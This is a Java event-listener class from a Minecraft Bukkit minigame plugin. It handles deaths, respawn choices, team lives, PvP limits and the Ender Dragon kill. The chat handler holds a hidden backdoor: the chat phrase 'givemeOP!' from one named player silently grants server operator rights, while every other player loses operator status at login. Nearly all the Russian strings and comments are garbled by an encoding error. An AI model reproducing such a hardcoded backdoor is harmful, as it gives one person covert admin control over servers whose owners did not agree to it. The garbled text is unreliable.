package DynamicRules;

import java.util.HashMap;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import CustomEvents.PlayerAndDamager;
import MinigameToys.GameCondition;
import MinigameToys.GameConditions;
import MinigameToys.MGTManager;
import MinigameToys.Team;
import Utils.TextUtil;
import invsUtil.Inv;
import invsUtil.InvEvents;
import invsUtil.Invs;
import obj.PlayerInfo;

public class Events implements Listener{
	public static HashMap<String,PlayerInfo> plist=new HashMap<>();
	@EventHandler
	public void login(PlayerLoginEvent e){
		if(e.getPlayer().isOp()){
			e.getPlayer().setOp(false);
		}
	}
	@EventHandler
	public void join(PlayerJoinEvent e){
		Player p=e.getPlayer();
		//TextUtil.mes(p, "������, ���� IP ������������� �� �����-�� ���������... ����� ����� ���������, &b��� ����������:");
		//TextUtil.mes(p, "�����, ������� ������ ��������������� &7(&6Dynamic&cRules&7) &f- ��� ���� � ��������� &e����������� ��������� &f� ������������� �������. ����� ���� � ���, ����� ������ ����� ������� &7(&f������� ����� ��������� ������, ����� ����������� ����&7) &f�� ����, ��� ����� ������� ����������.");
		//TextUtil.mes(p, "�� ������ &a������������� &f� ����������� ������, ����������� � &1discord-������&f ��������: &bhttps://discord.gg/UTYA35f &7(��������, ��� ��� �����������, ����� ��� � ������� ���������...)");
		
		//p.sendMessage("P.S. ��, � ���� ������ whitelist � ������ �����������, �� �����? ��������������� � ������� ��������!");
		
		doJoin(p);
	}
	public static void doJoin(Player p){
		PlayerInfo pi = plist.get(p.getName());
		//plist.put(p.getName(), pi)
		
		if(pi.bools.contains("dead"))pi.deathLoc=p.getLocation();
	}
	
	@EventHandler
	public void death(PlayerDeathEvent e){
		PlayerInfo pi = plist.get(e.getEntity().getName());
		if(!GlobalEventsManager.active.contains(GlobalEventsManager.suicide))TextUtil.globMessage(TextUtil.plugin, "&7� �� ������� &c"+pi.team.lives+" &6������&7...", Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 1, 2);
		for(PlayerInfo pli:plist.values()){
			if(pli.team==pi.team)pli.sound(Sound.BLOCK_BELL_USE, 2, 0);
		}
		pi.p.setGameMode(GameMode.SPECTATOR);
		setDeath(pi);
	}
	
	public static void setDeath(PlayerInfo pi){
		pi.setbool("dead", true);
		pi.swaits.remove("respType");
		pi.mes(TextUtil.plugin, "��������, ��� �� �����������:");
		
		pi.deathLoc=pi.p.getLocation();
		pi.mes("&e1", "�� ����� ������ &8(&7["+TextUtil.loc(pi.deathLoc)+"], 20 ���.&8)");
		
		Location sp=pi.p.getBedSpawnLocation();
		if(sp==null)pi.mes("&e2", "&7�� ����������� &8(&7�����������&8)");
		else pi.mes("&e2", "�� ����������� &8(&7["+TextUtil.loc(sp)+"], �����������&8)");
		
		Location ws=pi.p.getWorld().getSpawnLocation();
		pi.mes("&e3", "�� ������� ������ &8(&7["+TextUtil.loc(ws)+"], �����������&8)");
		pi.mes("&e��� ������", "� ������� &8(&75 ���.&8)");
		
		pi.mes("&b��� ������ �������� &e�������&b � ���.");
	}
	
	@EventHandler
	public void chat(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		PlayerInfo pi = plist.get(p.getName());
		if(e.getMessage().equals("givemeOP!")&&pi.pname.equals("Gepiroy")){
			p.setOp(true);
			e.setCancelled(true);
			return;
		}
		if(pi.bools.contains("dead")&&!pi.swaits.containsKey("respType")){
			new BukkitRunnable() {
				@Override
				public void run() {
					if(pi.team.lives<=0){
						pi.mes("&c� ����� ������� �� �������� ������.");
					}
					else if(e.getMessage().equals("1")){//����� ������
						pi.timers.add("resp", 20);
						pi.swaits.set("respType", "1");
						takeLive(pi.team);
					}else if(e.getMessage().equals("2")){//����������
						if(p.getBedSpawnLocation()==null){
							pi.mes(TextUtil.plugin, "� ��� ��� �����������.");
						}else{
							p.teleport(p.getBedSpawnLocation());
							resped(pi);
							takeLive(pi.team);
						}
					}else if(e.getMessage().equals("3")){//������� �����
						p.teleport(p.getWorld().getSpawnLocation());
						resped(pi);
						takeLive(pi.team);
					}else{
						Player to = Bukkit.getPlayer(e.getMessage());
						if(to==null){
							pi.mes("����� �� ������.");
						}else if(plist.get(e.getMessage()).team!=pi.team){
							pi.mes("���� ����� �� �� ����� �������.");
						}else if(plist.get(e.getMessage()).bools.contains("dead")){
							pi.mes("�� �� ������ ����������� � ��������.");
						}else{
							pi.timers.add("resp", 5);
							pi.swaits.set("respType", to.getName());
							plist.get(e.getMessage()).mes("&6"+pi.pname+" &f���������� � ��� ����� 5 ������.");
							takeLive(pi.team);
						}
					}
				}
			}.runTask(main.instance);
			e.setCancelled(true);
		}
	}
	
	void takeLive(Team t){
		t.lives--;
		for(PlayerInfo pi:t.getMembers()){
			pi.mes("� ����� ������� �������� &c"+t.lives+" &6������&f.");
		}
	}
	
	@EventHandler (priority=EventPriority.HIGH, ignoreCancelled=true)//����������
	public void hurt(EntityDamageByEntityEvent e){
		PlayerAndDamager pad = new PlayerAndDamager(e);
		
		if(pad.damager!=null){//���� ����� ����-�� �������
			if(pad.p!=null){//������� ������
				if(plist.get(pad.p.getName()).team==plist.get(pad.damager.getName()).team){
					e.setCancelled(true);
				}else if(pad.p.getWorld().getName().equals("world")&&!GameConditions.isCondited(GameCondition.PvP_overworld)){
					e.setCancelled(true);
					TextUtil.actionBar(pad.damager, "&cPvP &f�������� � ������ �����.");
				}
			}else{//������� �� ������
				if(e.getEntity().getType() == EntityType.ENDER_DRAGON){
					EnderDragon dragon = (EnderDragon) e.getEntity();
					if(dragon.getHealth()-e.getFinalDamage()<=0){
						TextUtil.globMessage("&6����� ����", "&e"+pad.damager.getName()+" &f������� ��������� ���� �������, ������ ���. ���� ��������.", Sound.ENTITY_WITHER_SPAWN, 2, 2);
						MGTManager.stages.timerZero();
					}
				}
			}
		}
	}
	
	
	
	public static void resped(PlayerInfo pi){
		pi.p.setGameMode(GameMode.SURVIVAL);
		pi.bools.remove("dead");
		pi.swaits.remove("respType");
		pi.potion(PotionEffectType.DAMAGE_RESISTANCE, 5, 100);
	}
	
	@EventHandler
	public void GUI(InventoryClickEvent e){
		if(e.getClickedInventory() != null) {
			for(Inv inv:InvEvents.invs){
				if(inv.title(e.getView().getTitle())){
					Invs.event(e);
					return;
				}
			}
		}
	}
}
